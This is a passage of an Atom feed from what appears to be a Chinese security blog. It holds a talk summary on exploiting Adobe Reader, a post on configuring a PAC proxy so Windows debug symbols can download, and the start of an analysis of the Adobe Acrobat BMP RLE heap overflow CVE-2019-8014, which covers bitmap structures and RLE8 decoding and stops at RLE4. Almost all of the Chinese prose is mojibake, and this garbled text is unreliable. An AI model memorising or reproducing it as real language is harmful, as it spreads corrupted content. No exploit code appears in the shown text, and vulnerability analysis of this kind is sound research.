      &lt;p&gt;è¿™æ¬¡æˆ‘åœ¨ HITB Lockdown Livestream ä¸Šå‘è¡¨äº†é¢˜ä¸ºã€Š&lt;strong&gt;Pwning Adobe Reader Multiple Times with Malformed Strings&lt;/strong&gt;ã€‹çš„æ¼”è®²ï¼Œè¯¥æ¼”è®²æœ¬æ¥æ˜¯ä¸º HITB 2020 Amsterdam å‡†å¤‡çš„ï¼Œä½†ç”±äºå—ç–«æƒ…å½±å“ï¼Œä¸»åŠæ–¹è¢«è¿«å–æ¶ˆäº†åŸæ¥çš„ä¼šè®®å®‰æ’ï¼Œè½¬è€Œåœ¨ YouTube ä¸Šä¸¾åŠäº†ä¸€æ¬¡å…è´¹çš„åœ¨çº¿ä¼šè®®ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="CVE-2019-7032" scheme="http://programlife.net/tags/CVE-2019-7032/"/>
    
      <category term="CVE-2019-8199" scheme="http://programlife.net/tags/CVE-2019-8199/"/>
    
      <category term="CVE-2020-3804" scheme="http://programlife.net/tags/CVE-2020-3804/"/>
    
      <category term="CVE-2020-3805" scheme="http://programlife.net/tags/CVE-2020-3805/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
  </entry>
  
  <entry>
    <title>Windows è°ƒè¯•ç¬¦å·ä¸‹è½½ä»£ç†é…ç½®</title>
    <link href="http://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/"/>
    <id>http://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/</id>
    <published>2020-02-23T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨ Windows ä¸‹è°ƒè¯•ç¨‹åºæ—¶ï¼Œå‘ç°æ— æ³•ä¸‹è½½å¾®è½¯æä¾›çš„è°ƒè¯•ç¬¦å·äº†ï¼ˆæç¤º <code>E_PDB_NOT_FOUND</code>ï¼‰ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯å¾®è½¯è‡ªå·±çš„åŸå› ï¼Œå› ä¸ºä»¥å¾€çš„ç»éªŒè¡¨æ˜ï¼Œå¾®è½¯åœ¨ Patch Tuesday ä¹‹åçš„ä¸€æ®µæ—¶é—´é‡Œå¯èƒ½å°±æ˜¯æ— æ³•æ­£å¸¸ä¸‹è½½è°ƒè¯•ç¬¦å·ã€‚</p><p><img src="/uploads/202002/ida-pro-pdb-not-found.png" alt="IDA Pro æ— æ³•ä¸‹è½½ Notepad çš„è°ƒè¯•ç¬¦å·"></p><a id="more"></a><p>åæ¥å‘ç°ï¼Œè¿™æ¬¡æ˜¯æ— æ³•ä»å¾®è½¯çš„æœåŠ¡å™¨ä¸‹è½½ä»»ä½•è°ƒè¯•ç¬¦å·ï¼Œæ¯”å¦‚ä½¿ç”¨ WinDbg è‡ªå¸¦çš„ <code>symchk.exe</code> æ— æ³•ç»™ System32 ç›®å½•ä¸‹çš„ä»»ä¸€æ–‡ä»¶ä¸‹è½½è°ƒè¯•ç¬¦å·ï¼Œè€Œä¸”åœ¨ä¸åŒçš„æœºå™¨ä¸Šï¼ˆæ‹¥æœ‰ä¸åŒçš„ä»£ç†ä¸Šç½‘ç¯å¢ƒï¼‰å‡ä¸èƒ½ä¸‹è½½è°ƒè¯•ç¬¦å·ï¼Œè¿™å°±éå¸¸å¥‡æ€ªäº†ã€‚</p><p>ç¬”è€…åœ¨æŸä¸å­˜åœ¨çš„ç¤¾äº¤ç½‘ç«™ä¸Šååº”äº†è¿™ä¸ªé—®é¢˜ï¼Œæœ‰ç½‘å‹è¡¨ç¤ºéœ€è¦ä½¿ç”¨ VPNï¼Œä¹Ÿæœ‰ç½‘å‹è¡¨ç¤ºéœ€è¦ç»•è¿‡é•¿åŸï¼Œè¿˜æœ‰ç½‘å‹è¡¨ç¤º VPN ä¹Ÿä¸è§£å†³é—®é¢˜ï¼Œè€Œå›½å¤–å‹äººåˆ™è¡¨ç¤ºå®Œå…¨ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼å¾ˆæ˜¾ç„¶ï¼Œè¿™è·Ÿå›½å†…å¤æ‚çš„ç½‘ç»œç¯å¢ƒä¸æ— å…³ç³»ï¼</p><p>ç¬”è€…æ‰“å¼€äº† Wiresharkï¼Œæƒ³çœ‹çœ‹ä»å¾®è½¯çš„æœåŠ¡å™¨ä¸‹è½½è°ƒè¯•ç¬¦å·æ—¶åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆã€‚æ¯”å¦‚ï¼Œåœ¨ç»™ Notepad ä¸‹è½½è°ƒè¯•ç¬¦å·æ—¶ï¼Œåå°è®¿é—®çš„ URL å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://msdl.microsoft.com/download/symbols/notepad.pdb/BC0D363AF49A0E2C05B06DA4535DA0C71/notepad.pdb</span><br></pre></td></tr></table></figure><p>æ¥ç€ä¼šé‡å®šå‘åˆ°ä»¥ä¸‹åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://vsblobprodscussu5shard60.blob.core.windows.net/b-4712e0edc5a240eabf23330d7df68e77/F6311B221044787072987B74992D6DE770FCBBFED09C2853B4F10350CB964FF900.blob?sv=2017-04-17&amp;sr=b&amp;si=1&amp;sig=ulHtMVJpGWuEvNczzOR6J3g2rXS1s9qwwmEqJ1x63wg%3D&amp;spr=https&amp;se=2020-02-24T01%3A57%3A40Z&amp;rscl=x-e2eid-66439cf8-65874550-b9c5b293-e8bf7391-session-627c05ca-398743d1-b7a6ab61-b0fbc28f</span><br></pre></td></tr></table></figure><p>Chrome æç¤º <code>ERR_CONNECTION_RESET</code> ï¼Œæ˜¾ç„¶ <code>vsblobprodscussu5shard60.blob.core.windows.net</code> è¢« Block äº†ã€‚é‚£ä¸ºä»€ä¹ˆæ­¤æ—¶ä»£ç†ä¸ç®¡ç”¨äº†å‘¢ï¼Ÿè€Œä»£ç†æœåŠ¡å™¨æœ¬èº«æ˜¯å¯ä»¥æ­£å¸¸è®¿é—®è¿™ä¸ªåœ°å€çš„ï¼Œæˆ–è€…è¯´ï¼ŒåŸºäºä»£ç†æœåŠ¡å™¨ä¸Šçš„ VPN ä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—®è¿™ä¸ªåœ°å€ã€‚</p><p>åæ¥å‘ç°ï¼Œç¬”è€…ä½¿ç”¨çš„æ˜¯ PAC ä»£ç†ä¸Šç½‘æ¨¡å¼ï¼ˆ<strong>Proxy Auto-Config</strong>ï¼Œ<a href="https://zh.wikipedia.org/zh-hans/%E4%BB%A3%E7%90%86%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE" target="_blank" rel="noopener">ä»£ç†è‡ªåŠ¨é…ç½®</a>ï¼‰ï¼Œä¸Šç½‘æµé‡è¦ä¸è¦ç»è¿‡ä»£ç†æœåŠ¡å™¨æ˜¯æ ¹æ® PAC è§„åˆ™æ–‡ä»¶æ¥å®šçš„ï¼ˆç›¸å¯¹å…¨å±€ä»£ç†æ¨¡å¼æ›´åŠ æ™ºèƒ½ï¼‰ï¼Œè€Œ <code>windows.net</code> å¹¶æ²¡æœ‰å‡ºç°åœ¨ä¸€äº›æµè¡Œçš„ PAC è§„åˆ™æ–‡ä»¶ä¸­ï¼Œå› æ­¤è¿™é‡Œæ— æ³•æ­£å¸¸ä¸‹è½½è°ƒè¯•ç¬¦å·æ–‡ä»¶ã€‚</p><p>è§£å†³æ–¹æ¡ˆéå¸¸ç®€å•ï¼Œç»™ PAC è§„åˆ™æ–‡ä»¶å¢åŠ ä¸€æ¡è®°å½• <code>.windows.net</code> ï¼Œè¡¨ç¤ºæ”¯æŒ <code>windows.net</code> ä¸‹æ‰€æœ‰åœ°å€çš„è®¿é—®ã€‚</p><p><img src="/uploads/202002/across-the-great-wall.png" alt="è¶Šè¿‡é•¿åŸï¼Œèµ°å‘ä¸–ç•Œ"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘åœ¨ Windows ä¸‹è°ƒè¯•ç¨‹åºæ—¶ï¼Œå‘ç°æ— æ³•ä¸‹è½½å¾®è½¯æä¾›çš„è°ƒè¯•ç¬¦å·äº†ï¼ˆæç¤º &lt;code&gt;E_PDB_NOT_FOUND&lt;/code&gt;ï¼‰ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯å¾®è½¯è‡ªå·±çš„åŸå› ï¼Œå› ä¸ºä»¥å¾€çš„ç»éªŒè¡¨æ˜ï¼Œå¾®è½¯åœ¨ Patch Tuesday ä¹‹åçš„ä¸€æ®µæ—¶é—´é‡Œå¯èƒ½å°±æ˜¯æ— æ³•æ­£å¸¸ä¸‹è½½è°ƒè¯•ç¬¦å·ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/202002/ida-pro-pdb-not-found.png&quot; alt=&quot;IDA Pro æ— æ³•ä¸‹è½½ Notepad çš„è°ƒè¯•ç¬¦å·&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
    
      <category term="WinDbg" scheme="http://programlife.net/tags/WinDbg/"/>
    
  </entry>
  
  <entry>
    <title>æ·±å…¥åˆ†æ Adobe å¿½ç•¥äº† 6 å¹´çš„ PDF æ¼æ´</title>
    <link href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/"/>
    <id>http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/</id>
    <published>2019-09-12T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p><em>æœ¬æ–‡è¯¦ç»†åˆ†æäº† Adobe Acrobat Reader / Pro DC ä¸­è¿‘æœŸä¿®å¤çš„å®‰å…¨æ¼æ´ CVE-2019-8014 ã€‚æœ‰è¶£çš„æ˜¯ï¼ŒAdobe åœ¨å…­å¹´å‰ <strong><del>ä¿®å¤</del></strong> äº†ä¸€ä¸ªç±»ä¼¼çš„æ¼æ´ CVE-2013-2729 ï¼Œæ­£æ˜¯ç”±äºå¯¹è¯¥æ¼æ´çš„ä¿®å¤ä¸å¤Ÿå®Œå–„ï¼Œæ‰ä½¿å¾— CVE-2019-8014 é—ç•™äº†é•¿è¾¾å…­å¹´ä¹‹ä¹…ã€‚æœ¬æ–‡åŒæ—¶è®¨è®ºäº†å¦‚ä½•ä¸ºæ­¤ç±»æ¼æ´ç¼–å†™åˆ©ç”¨ä»£ç ã€‚</em></p><p>æœ¬æ–‡ä½œè€…ï¼š<strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p><a id="more"></a><h2 id="0x01-æ¼æ´ç®€ä»‹"><a href="#0x01-æ¼æ´ç®€ä»‹" class="headerlink" title="0x01. æ¼æ´ç®€ä»‹"></a>0x01. æ¼æ´ç®€ä»‹</h2><p>Adobe åœ¨å…«æœˆä»½ä¸º Adobe Acrobat and Reader å‘å¸ƒäº†å®‰å…¨å…¬å‘Š <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> ï¼Œå’Œå¾€å¸¸ä¸€æ ·ï¼Œè¿™æ¬¡æ›´æ–°ä¿®å¤äº†å¤§é‡æ¼æ´ã€‚å½“ç¬”è€…åœ¨ <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> ä¸ŠæŸ¥çœ‹å¯¹åº”çš„æ¼æ´å…¬å‘Šæ—¶ï¼Œç›®å…‰è¿…é€Ÿè¢« <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> æ‰€å¸å¼•ï¼Œå› ä¸ºæ¨¡å— <code>AcroForm</code> ä¸­ Bitmap è§£æç›¸å…³çš„æ¼æ´éå¸¸å°‘è§ã€‚è¯¥æ¼æ´åœ¨ ZDI ä¸Šçš„éƒ¨åˆ†å…¬å‘Šä¿¡æ¯å¦‚ä¸‹ï¼š</p><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p><p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><p>çœ‹æè¿°è¿™å’Œå…­å¹´ä¹‹å‰ä¿®å¤çš„æ¼æ´ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> éå¸¸ç›¸ä¼¼â€”â€”éƒ½å’Œ <strong>XFA Bitmap Run Length Encoding</strong> è§£ææœ‰å…³ï¼å®é™…ä¸Šï¼Œä¸¤ä¸ªæ¼æ´ä¹‹é—´ç¡®å®æœ‰ç€åƒä¸ä¸‡ç¼•çš„è”ç³»ï¼Œæœ¬æ–‡å°†è¯¦ç»†åˆ†ææ¼æ´çš„åŸç†ä»¥åŠä¸¤è€…ä¹‹é—´çš„å…³ç³»ã€‚</p><p>æ¼æ´ CVE-2019-8014 åœ¨ ZDI ä¸Šçš„è‡´è°¢ä¿¡æ¯ä¸º <code>ktkitty (https://ktkitty.github.io)</code> ã€‚</p><h2 id="0x02-ç¯å¢ƒæ­å»º"><a href="#0x02-ç¯å¢ƒæ­å»º" class="headerlink" title="0x02. ç¯å¢ƒæ­å»º"></a>0x02. ç¯å¢ƒæ­å»º</h2><p>æ ¹æ®å®˜æ–¹å…¬å‘Š <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> çš„æè¿°ï¼Œè¯¥æ¼æ´å½±å“ <code>2019.012.20035</code> ä»¥åŠæ›´æ—©ç‰ˆæœ¬çš„ Adobe Acrobat and Reader ï¼Œè€Œä¸å—å½±å“çš„æœ€æ–°ç‰ˆæœ¬å·ä¸º <code>2019.012.20036</code> ã€‚æœ¬æ–‡åŸºäºå‰è€…è¿›è¡Œæ¼æ´åˆ†æã€åŸºäºåè€…è¿›è¡Œè¡¥ä¸åˆ†æã€‚</p><p>å®‰è£… Adobe Acrobat Reader DC <code>2019.012.20035</code> çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>ä¸‹è½½å¹¶å®‰è£… <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">ä¸‹è½½é“¾æ¥</a>)</li><li>å‡çº§åˆ° <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">ä¸‹è½½é“¾æ¥</a>)</li></ol><p>å®‰è£… Adobe Acrobat Reader DC <code>2019.012.20036</code> çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>ä¸‹è½½å¹¶å®‰è£… <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">ä¸‹è½½é“¾æ¥</a>)</li></ol><p>åœ¨è°ƒè¯•ç¯å¢ƒä¸­å®‰è£…å¥½è½¯ä»¶åï¼Œè®°å¾—ç¦ç”¨æ›´æ–°æœåŠ¡ <em>Adobe Acrobat Update Service</em> æˆ–è€…ç›´æ¥æ–­å¼€ç½‘ç»œè¿æ¥ï¼Œé˜²æ­¢ Adobe Acrobat Reader DC è‡ªåŠ¨æ›´æ–°ã€‚</p><h2 id="0x03-ä½å›¾ç®€ä»‹"><a href="#0x03-ä½å›¾ç®€ä»‹" class="headerlink" title="0x03. ä½å›¾ç®€ä»‹"></a>0x03. ä½å›¾ç®€ä»‹</h2><p>åœ¨è¿›è¡Œæ¼æ´åˆ†æä¹‹å‰ï¼Œå…ˆç®€å•ä»‹ç»ä¸€ä¸‹ä½å›¾çš„ç»“æ„ã€‚å¦‚æœä½ å¯¹ä½å›¾å·²ç»éå¸¸ç†Ÿæ‚‰ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è·³è¿‡æœ¬å°èŠ‚å†…å®¹ã€‚</p><h3 id="3-1-ç›¸å…³ç»“æ„"><a href="#3-1-ç›¸å…³ç»“æ„" class="headerlink" title="3.1 ç›¸å…³ç»“æ„"></a>3.1 ç›¸å…³ç»“æ„</h3><p>é€šå¸¸æ¥è¯´ï¼Œä½å›¾æ–‡ä»¶ç”±ä»¥ä¸‹å››éƒ¨åˆ†æ„æˆï¼š</p><ol><li>Bitmap File Header</li><li>Bitmap Info Header</li><li>RGBQUAD Array</li><li>Bitmap Data</li></ol><h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>ç»“æ„ä½“ <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// æ–‡ä»¶æ ‡è®° 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// ä½å›¾æ–‡ä»¶çš„å¤§å°</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// ä¿ç•™å­—æ®µ 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// ä¿ç•™å­—æ®µ 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// ä½å›¾æ•°æ®åœ¨æ–‡ä»¶ä¸­çš„åç§»å€¼</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>ç»“æ„ä½“ <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// ç»“æ„ä½“çš„å¤§å°</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// ä½å›¾å®½åº¦</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// ä½å›¾é«˜åº¦</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// å¿…é¡»ä¸º 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// æ¯ä¸ªåƒç´ æ‰€å ç”¨çš„ä½æ•°</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// å‹ç¼©ç®—æ³•</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// æ•°æ®å¤§å°</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// æ°´å¹³åˆ†è¾¨ç‡</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// å‚ç›´åˆ†è¾¨ç‡</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// è‰²å½©ç´¢å¼•æ•°</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// å¿…é¡»çš„è‰²å½©ç´¢å¼•æ•°</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆå‘˜ <code>biCompression</code> æŒ‡æ˜äº†ä½å›¾æ‰€ä½¿ç”¨çš„å‹ç¼©ç®—æ³•ï¼Œéƒ¨åˆ†å‹ç¼©ç®—æ³•çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// æœªä½¿ç”¨å‹ç¼©ç®—æ³•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// RLE8 å‹ç¼©ç®—æ³•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// RLE4 å‹ç¼©ç®—æ³•</span></span></span><br><span class="line"><span class="comment">// å…¶ä»–å‹ç¼©ç®—æ³•...</span></span><br></pre></td></tr></table></figure><h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>ç»“æ„ä½“ <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> æè¿°ä¸€ä¸ªåƒç´ çš„è‰²å½©ç»„æˆï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><p><strong>RGBQUAD Array</strong> ä»£è¡¨äº†ä¸€å¼ è‰²å½©è¡¨ï¼Œä½å›¾æ•°æ®åœ¨è§£æä¹‹åå¯ä»¥æ˜¯ä¸€ä¸ªç´¢å¼•ï¼Œç´¢å¼•åœ¨æ•°ç»„ä¸­å¯¹åº”çš„å€¼ä¾¿æ˜¯è¯¥åƒç´ çš„è‰²å½©è¡¨ç¤ºã€‚è¯¥æ•°ç»„çš„é•¿åº¦å–å†³äºç»“æ„ä½“ <strong>BITMAPINFOHEADER</strong> ä¸­çš„ <code>biBitCount</code> å’Œ <code>biClrUsed</code> æˆå‘˜çš„å€¼ã€‚</p><h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>ä½å›¾çš„ä½æ•°æ®ï¼Œè¯¥éƒ¨åˆ†æ•°æ®çš„è¡¨ç°å½¢å¼å–å†³äºä½å›¾æ‰€ä½¿ç”¨çš„å‹ç¼©ç®—æ³•ã€‚</p><p>æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼šä½å›¾æ•°æ®æ˜¯ä»å·¦ä¸‹è§’å¾€å³ä¸Šè§’æ–¹å‘è¿›è¡Œå¡«å……çš„ï¼Œå³ä½å›¾æ•°æ®ä¸­è§£æå‡ºæ¥çš„ç¬¬ä¸€ä¸ªåƒç´ çš„è‰²å½©ï¼Œåº”å½“å¡«å……åˆ°ä½å›¾çš„å·¦ä¸‹è§’ [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)]ï¼Œéšåä¾æ¬¡å¡«å……å½“å‰è¡Œçš„åƒç´ ï¼Œå½“å‰è¡Œå¡«å……å®Œæ¯•ä¹‹åï¼Œå¾€ä¸Šç§»åŠ¨ä¸€ä¸ªåƒç´ ç»§ç»­ä»¥è¡Œä½å•ä½è¿›è¡Œå¡«å……ï¼Œç›´åˆ°ä½å›¾å¡«å……å®Œæ¯•ã€‚</p><h3 id="3-2-RLE-ç¼–ç "><a href="#3-2-RLE-ç¼–ç " class="headerlink" title="3.2 RLE ç¼–ç "></a>3.2 RLE ç¼–ç </h3><p>ä½å›¾æ”¯æŒä¸¤ç§ç±»å‹çš„ RLEï¼ˆ<strong>Run Length Encoding</strong>ï¼‰å‹ç¼©ç®—æ³•ï¼š<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> å’Œ <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> ã€‚</p><h4 id="3-2-1-RLE8-ç¼–ç "><a href="#3-2-1-RLE8-ç¼–ç " class="headerlink" title="3.2.1 RLE8 ç¼–ç "></a>3.2.1 RLE8 ç¼–ç </h4><p>RLE8 å‹ç¼©ç®—æ³•ç”¨äºå‹ç¼© 8 ä½ä½å›¾ï¼ˆå³æ¯ä¸ªåƒç´ å ç”¨ 1 å­—èŠ‚ç©ºé—´ï¼‰ã€‚RLE8 å‹ç¼©åçš„æ•°æ®å¯ä»¥å¤„äº <strong>ç¼–ç æ¨¡å¼ï¼ˆEncoded Modeï¼‰</strong> å’Œ <strong>ç»å¯¹æ¨¡å¼ï¼ˆAbsolute Modeï¼‰</strong> ä¸­çš„ä»»æ„ä¸€ç§ï¼ˆä¸¤ç§æ¨¡å¼åœ¨åŒä¸€ä¸ªä½å›¾ä¸­å¯ä»¥åŒæ—¶å‡ºç°ï¼‰ã€‚</p><p><strong>ç¼–ç æ¨¡å¼</strong> åŒ…å«ä¸¤å­—èŠ‚æ•°æ®ï¼š</p><ul><li>å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ä¸ºé›¶ï¼Œå…¶å«ä¹‰ä¸ºç¬¬äºŒä¸ªå­—èŠ‚éœ€è¦é‡å¤çš„æ¬¡æ•°</li><li>å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºé›¶ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå­—èŠ‚çš„å¯èƒ½å«ä¹‰å¦‚ä¸‹<ul><li>0x00 è¡¨ç¤ºå½“å‰è¡Œå·²ç»ç»“æŸ</li><li>0x01 è¡¨ç¤ºä½å›¾è§£æå®Œæ¯•</li><li>0x02 è¡¨ç¤ºæ¥ä¸‹æ¥çš„ä¸¤ä¸ªå­—èŠ‚ <code>(deltaX, deltaY)</code> ä¸ºå½“å‰åæ ‡ <code>(x, y)</code> éœ€è¦ç§»åŠ¨çš„è·ç¦»</li></ul></li></ul><p>åœ¨ <strong>ç»å¯¹æ¨¡å¼</strong> ä¸­ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºé›¶ï¼Œç¬¬äºŒä¸ªå­—èŠ‚ä½äºåŒºé—´ <code>[0x03, 0xFF]</code> ã€‚ç¬¬äºŒä¸ªå­—èŠ‚è¡¨ç¤ºæ¥ä¸‹æ¥ç‰¹å®šæ•°é‡çš„å­—èŠ‚æ˜¯æœªå‹ç¼©çš„æ•°æ®ï¼ˆæ•°æ®é‡éœ€è¦æŒ‰ <code>WORD</code> å¯¹é½ï¼‰ã€‚</p><p>ä¸‹é¢ä¸º RLE8 å‹ç¼©ä¹‹åçš„æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ä¸ºè§£å‹ä¹‹åçš„æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="3-2-2-RLE4-ç¼–ç "><a href="#3-2-2-RLE4-ç¼–ç " class="headerlink" title="3.2.2 RLE4 ç¼–ç "></a>3.2.2 